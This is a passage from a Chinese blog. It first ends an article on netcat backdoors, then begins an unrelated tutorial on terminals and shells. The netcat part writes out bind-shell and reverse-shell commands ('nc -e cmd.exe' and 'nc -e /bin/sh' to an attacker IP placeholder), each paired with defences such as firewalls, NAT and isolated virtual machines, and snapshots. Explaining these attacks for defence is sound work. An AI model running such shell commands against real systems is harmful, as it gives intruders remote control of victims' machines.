-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">xxx</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
-<p>　　如果受害者是 POSIX 系统（Linux or UNIX），则用如下命令：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -l -p xxx -e <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>
-
-<p><strong>步骤2</strong><br>　　后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。</p>
-<h3 id="◇补充说明：-e-选项"><a href="#◇补充说明：-e-选项" class="headerlink" title="◇补充说明：-e 选项"></a>◇补充说明：<code>-e</code> 选项</h3><p>　　据说是考虑到 <code>-e</code> 选项太过危险，nc 的 OpenBSD 变种（在多年前）已经【移除】了该选项。但其实捏，还是可以用间接的方式达到同样的效果（具体如何做，俺就不透露啦）。<br>　　另，“原版 nc”依然有这个选项；nc 的很多其它变种，也依然有这个选项。</p>
-<h3 id="◇【不够】靠谱的防范措施"><a href="#◇【不够】靠谱的防范措施" class="headerlink" title="◇【不够】靠谱的防范措施"></a>◇【不够】靠谱的防范措施</h3><p>　　在这个场景中，大伙儿可能会想到三个值得改进之处：<br>1、浏览器的漏洞<br>2、使用公共 wifi 热点的习惯<br>3、防火墙的设置</p>
-<p>　　对第1点<br>　　其实是【无解】滴！因为任何人都无法确保浏览器是【零漏洞】；</p>
-<p>　　对第2点<br>　　要看每个人的具体情况而定。对有些人而言，“用公共热点上网”属于【刚需】。那就没办法了。</p>
-<p>　　对第3点<br>　　“防火墙”这招，似乎是比较通用的解决之道。对大部分人而言，桌面 PC 根本就【不必】开启对外监听端口。因此，你可以配置操作系统自带防火墙，禁止【所有的】对外监听端口。<br>　　但是！（俺要开始说【但是】了）<br>　　操作系统自带的防火墙，本身也运行在操作系统【之内】。如果你是以【管理员身份】遭遇入侵，入侵者在进行【代码执行】的时候，就已经具有了【管理员权限】。在这个权限下，入侵者完全有可能“搞定”防火墙。方法有很多种——<br>比如说：把用作后门的端口号，悄悄加入到防火墙的白名单中；<br>再比如说：直接把防火墙的过滤模块干掉；<br>更牛逼的入侵者，甚至可以在【网卡驱动】上做文章——因为网卡驱动位于防火墙的过滤模块【之下】（比防火墙更底层）</p>
-<h3 id="◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）"><a href="#◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）" class="headerlink" title="◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）"></a>◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）</h3><p>　　首先，这里所说的“NAT 模式”指的是【虚拟机的网卡模式】。如果你不熟悉虚拟机的网卡模式，建议先看俺写的《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/10/system-vm-0.html">扫盲操作系统虚拟机</a>》系列教程。</p>
-<p>　　要想用这招，步骤如下：<br>1、当然先要安装【虚拟化软件】（VBox、VMware …），<br>2、安装一个虚拟的操作系统（洋文叫“Guest OS”）<br>3、虚拟系统的网卡设置为【NAT】模式</p>
-<p>　　完成上述步骤后，你就可以在这个虚拟系统中上网。<br>　　NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。<br>　　在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】啦。</p>
-<h3 id="◇补充说明：“NAT-模式”如何搭配“系统防火墙”？"><a href="#◇补充说明：“NAT-模式”如何搭配“系统防火墙”？" class="headerlink" title="◇补充说明：“NAT 模式”如何搭配“系统防火墙”？"></a>◇补充说明：“NAT 模式”如何搭配“系统防火墙”？</h3><p>　　上述“NAT 招数”与“系统防火墙”并【不】矛盾。<br>　　也就是说，即使你用了这招，你的物理系统（Host OS）还是要配置系统防火墙，并禁止【所有的】对外监听端口。</p>
-<h2 id="★招数12：（入侵手法）用-nc-开启【主动】连接型后门"><a href="#★招数12：（入侵手法）用-nc-开启【主动】连接型后门" class="headerlink" title="★招数12：（入侵手法）用 nc 开启【主动】连接型后门"></a>★招数12：（入侵手法）用 nc 开启【主动】连接型后门</h2><h3 id="◇使用场景-11"><a href="#◇使用场景-11" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　为了打字省力，继续用【前一个章节】的场景。差别在于，你采纳了前一章节的措施——在某个 NAT 模式的虚拟机（Gest OS）中上网，以对付【被动】连接型的 nc 后门。<br>　　可惜的是——即便如此，入侵者在利用漏洞并获得“执行代码”的机会之后，还是有办法用 nc 在你的电脑上搞一个网络后门。<br>　　虽然你用了 NAT 模式的【虚拟机】（Guest OS），但入侵者可以用 nc 创建一个【主动】连接型的网络后门（这种玩法，有时也称作“反向连接”的后门）。</p>
-<h3 id="◇原理-3"><a href="#◇原理-3" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　原理其实与“招数11”很类似，唯一的差别在于——把客户端与服务端【对调】。也就是说，攻击者手头的 nc 充当服务端，而受害者机器上的 nc 充当客户端。此时，受害者本机的 nc【无须】开启监听端口，【不受】防火墙的影响，也【不受】NAT 的影响。</p>
-<h3 id="◇入侵方法-1"><a href="#◇入侵方法-1" class="headerlink" title="◇入侵方法"></a>◇入侵方法</h3><p><strong>步骤1</strong><br>　　既然 nc 的“服务端”与“客户端”对调。因此攻击者要先在自己机器上运行“服务端 nc”，命令如下（其中的 <code>xxx</code> 是端口号）。当然啦，攻击者自己电脑的防火墙需要允许 <code>xxx</code> 端口号对外监听。</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -lk -p xxx</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>步骤2</strong><br>　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门。</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">xxx</span><br></code></pre></td></tr></table></figure>
-<p>　　如果受害者是 POSIX 系统，则用如下命令：</p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -e /bin/sh <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx<br></code></pre></td></tr></table></figure>
-<p>　　（在上述两个命令中， <code>xxx</code> 是步骤1用到的端口号，<code>x.x.x.x</code> 是攻击者的 IP 地址）</p>
-<h3 id="◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机"><a href="#◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机" class="headerlink" title="◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机"></a>◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机</h3><p>　　所谓的【隔离模式】，指的是“Host Only 模式”或类似的模式（比如：“Internal 模式”）。<br>　　虽然当年那个系列讲的是【隐匿性】，但其中的【虚拟机隔离】，同样可以用来对付“主动连接型后门”。</p>
-<p>　　有必要提醒一下：<br>　　【隔离的虚拟机】可以增加入侵者的攻击难度。但【不能】做到 100% 防范。<br>　　只要你能在某个隔离虚拟机中上网，那么——那些足够高级的木马，就【有可能】在隔离虚拟机中找到对外连接的通道。从而实现一个“【主动】连接型的后门”。<br>　　这下该咋办捏？<br>　　（在安全方面）虚拟机有两个【显著好处】——“网络隔离性”只是其中之一，另一个是【快照】。<br>　　如果你对安全性的要求【非常高】，要学会：<br>1、用“快照功能”建立【安全基线】<br>（所谓的【安全基线】就是说——在确保系统【纯洁】的时候，先做一个快照）<br>2、养成【定期回退快照】的好习惯<br>（就算你中了木马，只要一回退到【安全基线】，系统重新变得【纯洁】啦）</p>
-<h3 id="◇“【主动】连接型后门”的优势之处（危险性之处）"><a href="#◇“【主动】连接型后门”的优势之处（危险性之处）" class="headerlink" title="◇“【主动】连接型后门”的优势之处（危险性之处）"></a>◇“【主动】连接型后门”的优势之处（危险性之处）</h3><p>　　简单对比一下“后门的两种连接方式”。</p>
-<p><strong>可用性</strong><br>　　如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。<br>　　相比之下，“主动型后门”就【没有】这种弊端。</p>
-<p><strong>隐蔽性</strong><br>　　“被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。<br>　　相比之下，“主动型后门”就【没有】这个问题。</p>
-<h2 id="★附录：netcat-的【其它变种】"><a href="#★附录：netcat-的【其它变种】" class="headerlink" title="★附录：netcat 的【其它变种】"></a>★附录：netcat 的【其它变种】</h2><p>　　本文开头部分已经介绍了“原版 nc”以及“OpenBSD 变种”。在结尾部分，简单聊聊其它几个变种。</p>
-<h3 id="◇GNU-netcat"><a href="#◇GNU-netcat" class="headerlink" title="◇GNU netcat"></a>◇GNU netcat</h3><p>　　官网在“<a target="_blank" rel="noopener" href="http://netcat.sourceforge.net/">这里</a>”。<br>　　从名称可以猜出：这是 GNU 社区对“原版 nc”的重写，以符合 GPL 许可协议。<br>　　按照它官网的说法，“GNU netcat”100% 兼容“原版 nc”的 1.10 版本。（注：1.10 版本是“原版 nc”用得最广的版本）</p>
-<h3 id="◇ncat"><a href="#◇ncat" class="headerlink" title="◇ncat"></a>◇ncat</h3><p>　　这是 nmap 社区重写的 nc，其官网页面在“<a target="_blank" rel="noopener" href="https://nmap.org/ncat/">这里</a>”，帮助页面在“<a target="_blank" rel="noopener" href="https://nmap.org/ncat/guide/">这里</a>”。<br>　　它的口号是：Ncat - Netcat for the 21st Century<br>　　与“OpenBSD 变种”类似，它也增加了代理的支持。相比“OpenBSD 变种”，它的主要亮点是：完全支持 SSL/TLS。<br>　　由于它源自 nmap 社区，已经被包含在 nmap 软件包中（大多数 Linux ＆ BSD 发行版的官方仓库都有 nmap）</p>
-<h3 id="◇socat"><a href="#◇socat" class="headerlink" title="◇socat"></a>◇socat</h3><p>　　在所有的变种里面，（据俺所知）这款可能是功能最强滴！但使用方法也有很大的不同（更复杂了）。感觉像是另一个全新的软件。<br>　　很多主流的 Linux 发行版已经包含它。<br>　　他也完全支持 SSL/TLS。</p>
-<h3 id="◇Cryptcat"><a href="#◇Cryptcat" class="headerlink" title="◇Cryptcat"></a>◇Cryptcat</h3><p>　　一看名称就能猜到：这是“加密的网猫”。<br>　　由于大部分网猫都是直接在“裸 TCP”之上传输数据。如果传输的内容本身是明文，会遭遇【网络嗅探】的风险。<br>　　这款变种在传输过程中用 twofish 算法加密，以规避嗅探。</p>
-<h3 id="◇sbd"><a href="#◇sbd" class="headerlink" title="◇sbd"></a>◇sbd</h3><p>　　光看这3字母的名称，你可能不知道这款变种的特色。<br>　　但如果俺告诉你：“sbd”是“Secure BackDoor”的缩写，你多半就猜到其特色了。<br>　　它的加密采用“AES-128-CBC + HMAC-SHA1”。</p>
-<h3 id="◇netrw"><a href="#◇netrw" class="headerlink" title="◇netrw"></a>◇netrw</h3><p>　　这是专门针对“文件传输”功能进行强化和简化的变种。<br>　　【简化】方面<br>　　它分成两个命令：<code>netread</code> 和 <code>netwrite</code>，分别对应发送和接收。（相对“原版 nc”）省了几个命令选项。<br>　　【强化】方面<br>　　它会对传输过程进行散列校验，以防止传输的数据被篡改。</p>
-</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T13:48:51.000Z" title="2021/7/16 下午9:48:51">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:27:52.410Z" title="2021/7/16 下午11:27:52">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/">编程随想</a></span><span class="level-item">2 小时读完 (大约17564个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/Linux-%E5%91%BD%E4%BB%A4%E8%A1%8C/">Linux&amp;命令行</a></h1><div class="content"><h1 id="扫盲-Linux＆UNIX-命令行——从“电传打字机”聊到“shell-脚本编程”"><a href="#扫盲-Linux＆UNIX-命令行——从“电传打字机”聊到“shell-脚本编程”" class="headerlink" title="扫盲 Linux＆UNIX 命令行——从“电传打字机”聊到“shell 脚本编程”"></a>扫盲 Linux＆UNIX 命令行——从“电传打字机”聊到“shell 脚本编程”</h1><p><strong>文章目录</strong></p>
-<p>★引子<br>★本文目标读者<br>★一切都从【电传打字机】开始说起<br>★终端（terminal/TTY）<br>★终端的3种【缓冲模式】——字符模式、行模式、屏模式<br>★终端的【回显】<br>★（早期的）系统控制台/物理控制台（system console）<br>★（如今的）虚拟控制台（virtual console）<br>★终端模拟器（terminal emulator）<br>★伪终端（PTY/pseudotty/pseudoterminal）<br>★shell——命令行解释器<br>★shell 的基本功能<br>★进程的启动与退出<br>★“进程控制”与“信号”<br>★作业控制（job）<br>★环境变量（environment variable）<br>★“标准流”（standard stream）与“重定向”（redirection）<br>★匿名管道（anonymous pipe）<br>★批处理（batch）<br>★shell 脚本<br>★结尾</p>
-<h2 id="★引子"><a href="#★引子" class="headerlink" title="★引子"></a>★引子</h2><p>　　首先，<br>　　这篇是为了补前几年的“欠债”。这些年，俺写了好多篇 Linux 相关的技术教程。但还从来没有【系统性】地介绍 Linux 命令行相关的基本概念和基本知识。几年来，已经有不少读者催俺填上这个大坑，但俺比较懒，一直拖到现在，惭愧 :(</p>
-<h2 id="★本文目标读者"><a href="#★本文目标读者" class="headerlink" title="★本文目标读者"></a>★本文目标读者</h2><p>　　虽然本文的标题号称是【扫盲】，但俺相信：<strong>即使是一些 POSIX 系统的命令行【老手】，对本文中介绍的某些概念，可能也会有【欠缺】。</strong><br>　　因此，这篇教程既适合于命令行的新手，也值得某些【老手】看一看。</p>
-<p>　　由于本文介绍的是 POSIX 系统中【通用的】概念与知识。因此，包括 Linux、BSD 家族、macOS 等各种系统的用户，应该都能从中受益。<br>　　（注：<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> 是某种操作系统的标准/规范。各种 Linux 发行版以及所有的 UNIX 变种，包括 macOS，都属于“POSIX 系统”）</p>
-<p>　　如果你是这方面的【菜鸟】，并且想要掌握这个领域。【不要】企图只看一遍就完全理解本文的内容（可能需要看好几遍）。俺的建议是：要一边看，一边拿命令行的环境【实践】一下。</p>
-<h2 id="★一切都从【电传打字机】开始说起"><a href="#★一切都从【电传打字机】开始说起" class="headerlink" title="★一切都从【电传打字机】开始说起"></a>★一切都从【电传打字机】开始说起</h2><p>　　（说完了“引子”与“目标读者”，开始切入正题）<br>　　可能有些读者会纳闷——“聊命令行的基本概念”，为啥要扯到“电传打字机”？是不是扯得太远了？<br>　　俺来解释一下：<br>　　IT 行业的很多基本概念都来自于【历史遗迹】。有时候你觉得某些东西很奇怪（并纳闷“为啥会设计成这样”）；而当你搞清楚历史的演变过程之后，自然就明白其中的原因。</p>
-<h3 id="◇在那遥远的【电报时代】"><a href="#◇在那遥远的【电报时代】" class="headerlink" title="◇在那遥远的【电报时代】"></a>◇在那遥远的【电报时代】</h3><p>　　在计算机诞生之前（二战前），【电报】属于高科技的玩意儿——它能够瞬间把信息传送到另一个城市（甚至传送到大洋彼岸）。<br>　　当年的电报线路，是以【字符】为单位发送信息。在线路两端使用【电传打字机】，就可以自动地把对方发过来的字符打印出来。</p>
-<p><img src="https://lh6.googleusercontent.com/SO-SrkxjARZ0k4dADyEbtp9vYYHbv37f1R_iYFZzit2KJjjmeRjLqrXb0gRlHebYTYz1QeT9KzkiJaCneNrhmuBQZaXhlpt2QVDB1N0_3eigwXAZuDmQGq6wmUYjA7zIsyRgxRejW5c" alt="不见图 请翻墙"><br>（上世纪40年代的电传打字机——用于电报网）</p>
-<h3 id="◇“回车-换行”的来历"><a href="#◇“回车-换行”的来历" class="headerlink" title="◇“回车/换行”的来历"></a>◇“回车/换行”的来历</h3><p>　　稍微懂点 IT 的同学，应该都听说过“回车/换行”，洋文分别称之为“carriage return”＆“line feed”。在编程领域，这两个字符简称为 <code>\r</code> ＆ <code>\n</code>。<br>　　为啥会有这么两个玩意儿捏？<br>　　因为在电传打字机时代，当打印完一行之后，需要用一个控制命令把“打印头”复位（移到打印纸的左边），然后再用另一个控制命令把“打印头”往下移动一行。很自然地，这俩动作就对应了两个控制字符（CR ＆ LF），也就是所谓的“回车 ＆ 换行”。</p>
-<h3 id="◇其它控制字符"><a href="#◇其它控制字符" class="headerlink" title="◇其它控制字符"></a>◇其它控制字符</h3><p>　　如果你去留意一下 ASCII 字符表的开头部分，前面那32个字符都是控制字符，很多都源于遥远的【电报时代】。<br>　　在本文后续的介绍中，还会再聊到这些“控制字符”。</p>
-<h2 id="★终端（terminal-TTY）"><a href="#★终端（terminal-TTY）" class="headerlink" title="★终端（terminal/TTY）"></a>★终端（terminal/TTY）</h2><h3 id="◇历史演变"><a href="#◇历史演变" class="headerlink" title="◇历史演变"></a>◇历史演变</h3><p>　　“终端”一词，洋文称之为“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computer_terminal">terminal</a>”。有时候又被称作 TTY，而 TTY 这个简写就来自刚才介绍的【电传打字机】（teletype printer）。<br>　　因为早期的大型机，其“终端”就是【电传打字机】。那时候的终端，也称作【硬件终端】。</p>
-<p>　　为啥会有“终端”这个概念捏？你依然需要了解历史的变迁。<br>　　最早期的计算机（大型机）是【单任务】滴——也就是说，每次只能干一件事情。<br>　　到了60年代，出现了一个【革命性】的飞跃——发明了【多任务】系统，当时叫做“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Time-sharing">time-sharing</a>”（分时系统）。有了“分时系统”，就可以让多个人同时使用一台大型机。而为了让多个人同时操作这台大型机，就引入了【终端】的概念。每一台大型机安装多个终端，每个操作员都在各自的终端上进行操作，互不干扰。</p>
-<h3 id="◇（跑题）“约翰·麦卡锡”其人"><a href="#◇（跑题）“约翰·麦卡锡”其人" class="headerlink" title="◇（跑题）“约翰·麦卡锡”其人"></a>◇（跑题）“约翰·麦卡锡”其人</h3><p>　　聊到这里，稍微跑题一下：<br>　　最早的“分时系统”由 IT 超级大牛“约翰·麦卡锡”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/John_McCarthy_(computer_scientist)">John McCarthy</a>）设计。此人不仅仅是“分时系统它爹”，还是“Lisp 语言它爹”，另外还参与设计了编程语言“ALGOL 60”。而这个“ALGOL 60”编程语言虽然知道的人不多，但该语言深刻影响了后续的 Ada、BCPL、C、Pascal……<br>　　为了让你体会这只大牛到底有多牛。俺引用另一个牛人保罗·格雷汉姆（《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/17i49-SpeKz1wRG5S-HPonO-lXJHD99h62gDsQ64NWXo/">黑客与画家</a>》作者）的观点——他认为在所有编程语言中， Lisp 与 C 是两座无法超越的高峰。而“约翰·麦卡锡”亲自发明了 Lisp 语言，然后又深刻地影响了 C 语言。<br>　　另外，麦卡锡这只大牛还参与创立了“MIT 人工智能实验室”与“斯坦福人工智能实验室”。前者涌现出一大批早期的黑客，其中包括大名鼎鼎的 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Richard_Stallman">Richard Stallman</a>（此人开创了：自由软件运动、GNU 社区、GCC、GDB、GNU Emacs ……）。</p>
-<p><img src="https://lh5.googleusercontent.com/0Yiucax8D7skki_Z5csmfmOhFXAc6nUnQfHik6WDoNRMPX4OJeqjq7GZcuHrjYFrBiPmqOunexkfby3c0NI7blTa1d_yDoELrPfIVVYFIHqJLHlQM8X94Ql4IKSyGsKuesGRYbJZKgU" alt="不见图 请翻墙"><br>（超级大牛约翰·麦卡锡）</p>
-<h3 id="◇【远程】终端"><a href="#◇【远程】终端" class="headerlink" title="◇【远程】终端"></a>◇【远程】终端</h3><p>　　跑题结束，言归正传。<br>　　“终端”的好处不光是“多任务”，而且还可以让用户在【远程】进行操作。这种情况下，“终端”通过 modem（调制解调器）与“主机”相连。这种玩法很类似于——互联网普及初期的拨号上网。示意图如下：</p>
-<p><img src="https://lh5.googleusercontent.com/iUIOjl4GY8O419YJ45c1BN4ri4U2eLJThOEq_Ff_6_gdfGwz76imgEqf6kHp0pgs1iGr0544VL5bTcRGkKaw42mz25Z0vYqEWXhbWwOKS9Y4Nh2UDfN_6LuM-PK1jhtDUtkGbHgV27k" alt="不见图 请翻墙"><br>（通过 modem 实现的【远程】终端）</p>
-<p>　　最早的“终端”，本质上就是“电传打字机”——以“打字机”作为输入；以“打印纸”作为输出。这类终端，比较经典的是如下这款：</p>
-<p><img src="https://lh3.googleusercontent.com/3tqr5yVvG9QF7vW_J45SWY8aMmGekLQZZNKOP48Vvi9V71qz9v45vbTs25tN6stF13qotXRkyuC_o76FLzYYAbDKzRXFNcSiKnoy5H-6BpRzQ2ZdR9ON1vjdfYYpThUHpthIYv9MoL0" alt="不见图 请翻墙"><br>（Teletype Model 33 ASR）</p>
-<p>　　到了上世纪70年初，终于有了带【屏幕】的远程终端。<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Digital_Equipment_Corporation">DEC 公司</a>的 VT05 是第一款基于 CRT 显示器的远程终端。</p>
-<p><img src="https://lh3.googleusercontent.com/SDvmTqKHE5lh3PPbrTUGvuX7V8Ux4fv3TdWvB7Ga8BbAVMKUJ8mwn9qp0UqI_6YEDYwhbrEqOWa2M3ifzrTTT5zrpzS-kJwijICRVQDldIfl2W3ra3WQuPxPzWD7I9u8d45z84l04dM" alt="不见图 请翻墙"><br>（VT05 终端）</p>
-<h3 id="◇内部结构示意图"><a href="#◇内部结构示意图" class="headerlink" title="◇内部结构示意图"></a>◇内部结构示意图</h3><p>　　下面这张是大型机时代，“终端”与“进程”通讯的示意图。<br>　　图中的 <code>UART</code> 是洋文“Universal Asynchronous Receiver and Transmitter”的缩写（相关维基百科链接在“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">这里</a>”）。LDISC 是洋文“line discipline”的简写（相关维基百科链接在“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Line_discipline">这里</a>”）。<br>　　通俗地说，UART 用来处理物理线路的字符传输（比如：“错误校验”、“流控”、等）；LDISC 用来撮合底层的“硬件驱动”与上层的“系统调用”，并完成某些“控制字符”的处理与翻译。</p>
-<p><img src="https://lh3.googleusercontent.com/wzvdclkzzYDah1LxS_lTCQqAbxdePKSr-w1XT7c91axw-_CuT7aATNsEuHxbWBYIOvhbifp8hrwLDkBpOXVQajgX5ZSDfcjvoqjjIpiQVV0EVbaldvA1geO_FHxMe40DMFZ9RfG7iSA" alt="不见图 请翻墙"><br>（TTY 示意图1：使用【硬件终端】的大型机内部结构图）</p>
-<h3 id="◇如今的含义"><a href="#◇如今的含义" class="headerlink" title="◇如今的含义"></a>◇如今的含义</h3><p>　　如今，“终端”一词的含义已经扩大了——<strong>用来指：基于【文本】的输入输出机制。</strong><br>　　在本文后续的章节中， terminal 与 TTY 这两个术语基本上是同义词。</p>
-<h2 id="★终端的3种【缓冲模式】——字符模式、行模式、屏模式"><a href="#★终端的3种【缓冲模式】——字符模式、行模式、屏模式" class="headerlink" title="★终端的3种【缓冲模式】——字符模式、行模式、屏模式"></a>★终端的3种【缓冲模式】——字符模式、行模式、屏模式</h2><h3 id="◇字符模式（character-mode）"><a href="#◇字符模式（character-mode）" class="headerlink" title="◇字符模式（character mode）"></a>◇字符模式（character mode）</h3><p>　　又要说回到【电传打字机】。<br>　　在本文开头，已经聊过这个玩意儿，并且提到——它是基于【字符】传输滴。也就是说，操作员每次在“电传打字机”上按键，对应的字符会立即通过线路发送给对方。这就是最传统的【字符模式】<br>　　通俗地说，“字符模式”也就是【无缓冲】的模式。</p>
-<h3 id="◇行模式（line-mode）"><a href="#◇行模式（line-mode）" class="headerlink" title="◇行模式（line mode）"></a>◇行模式（line mode）</h3><p>　　不客气地说，“字符模式”是非常傻逼滴！因为如果你不小心按错键，这个错误也会立即发送出去。<br>　　比如说，你在输入一串很长的命令，结果输到半当中，敲错一个按键，整个命令就废了——要重新再输入一遍。<br>　　所以，当早期的程序员对“字符模式”实在忍无可忍之后，终于发明了【行模式】。<br>　　【行模式】也叫做“行缓冲”。也就是说，终端会把你当前输入的这行先缓冲在本地。只有当你最终按了【回车键】，才会把这一整行发送出去。如果你不小心敲错了一个字符，可以赶紧用“退格键”删掉重输这个字符。<br>　　因此，这种模式称之为【行缓冲】。</p>
-<p>　　顺便说一下：<br>　　早期的标准键盘，【没有】方向键（“上下左右”这4个键）。不信的话，可以去看本文前面贴的那张“Teletype Model 33 ASR”的照片。<br>　　因为无论是“字符模式”还是“行模式”，都没这个需求。</p>
-<h3 id="◇屏模式（screen-mode-block-mode）"><a href="#◇屏模式（screen-mode-block-mode）" class="headerlink" title="◇屏模式（screen mode/block mode）"></a>◇屏模式（screen mode/block mode）</h3><p>　　“行模式”进一步的发展就是【屏模式】。这个玩意儿也叫“全屏缓冲”，顾名思义，终端会缓冲当前屏幕的内容。<br>　　在这种模式下，用户可以利用方向键，操纵光标（cursor）在屏幕上四处游走。<br>　　开发这种类型的软件，比较复杂——程序员至少需要做如下工作：<br>\1. 保存整个屏幕的状态<br>\2. 根据键盘输入，操纵光标（cursor）移动<br>\3. 控制屏幕的哪些区域是光标可达，哪些是不可达；<br>\4. 对于光标可达的部分，控制哪些是“可编辑”，哪些是“只读”；<br>\5. 根据“光标移动”以及某些“特定的按键”（比如“翻页键”），重新绘制屏幕<br>……<br>　　后来，为了简化”屏模式“的编程，专门搞了一个叫做 curses 的编程库。如今的“ncurses 库”就是从 curses 衍生出来滴（前面加了一个 n 表示 new）。</p>
-<p><img src="https://lh5.googleusercontent.com/nPGfx1VIMvI26G-L4q9jqaw-RYqRLkHIj3vjgOMHzxAFQMHgOEry2YyN4mXFPAxqvNPl4EwqJr0Q34Z9sMl_8HPNmm1eT-FAkJyU8FCJcSPovg8wb3UZJT5CIbdKz-zmeNdX0J2pFvk" alt="不见图 请翻墙"><br>（“重编译 Linux 内核”的配置界面，基于 ncurses 实现）</p>
-<p>　　前面说了——早期的键盘【没】方向键。有了这个【屏模式】之后，键盘上才开始增加了“方向键”（所以“方向键”位于键盘的扩展区）</p>
-<h3 id="◇小结"><a href="#◇小结" class="headerlink" title="◇小结"></a>◇小结</h3><p>　　上述这三种模式，第1种基本淘汰（仅限于极少数场景）；第3种用得也不多。与本文关系比较密切的，其实是【第2种】——行模式。<br>　　为了加深你的印象，用 <code>cat</code> 命令来举例（注：这个命令其实与“猫”【无关】，而是 concatenate 的简写）<br>　　大部分情况下，都是用它来显示某个文件的内容，比如说：<code>cat 文件名</code> 。但如果你运行 <code>cat</code>【没】加任何参数，那么它就会尝试读取你在终端的输入，然后把读到的文本再原样输出到终端。</p>
-<p><img src="https://lh5.googleusercontent.com/PPet_RllllnSmYALmxV56ohy5NZz1kj76GzbmcvM9HJDrqY6h74otCFL1E0rG_lEKnALViM8zv2E4BOj4bUUTixzD_QTTXsmoh0-U3dxJROpiAfvW2vHZ69s2vpYlq88-6FBngqgzSQ" alt="不见图 请翻墙"><br>（动画：演示“行模式”的效果）</p>
-<p>　　在上述动画中，你的输入并【没有】直接传递给 <code>cat</code> 进程。要一直等到你按下【回车键】，<code>cat</code> 进程才收到你的输入，并立即打印了输出。</p>
-<h2 id="★终端的【回显】"><a href="#★终端的【回显】" class="headerlink" title="★终端的【回显】"></a>★终端的【回显】</h2><h3 id="◇“回显”是啥？"><a href="#◇“回显”是啥？" class="headerlink" title="◇“回显”是啥？"></a>◇“回显”是啥？</h3><p>　　在刚才那个 gif 动画中，当俺逐个输入 <code>test</code> 的每个字母，这些字母也会逐个显示在屏幕上。这种做法叫做【回显】。</p>
-<h3 id="◇“回显”的打开与关闭（启用-禁用）"><a href="#◇“回显”的打开与关闭（启用-禁用）" class="headerlink" title="◇“回显”的打开与关闭（启用/禁用）"></a>◇“回显”的打开与关闭（启用/禁用）</h3><p>　　虽然“回显”很人性化，但某些特殊的场合是【不想】“回显”滴，比如当你输入密码/口令的时候。<br>　　因此，终端提供了某种机制，使得程序能够控制“回显”的启用/禁用。<br>　　对于大多数终端，可以用【<code>Ctrl + S</code>】禁用“回显”，然后用【<code>Ctrl + Q</code>】启用“回显”。<br>　　如果你在禁用“回显”的情况下输入一些文本，当你重新启用“回显”的瞬间，这些文本会一起出现在屏幕上。</p>
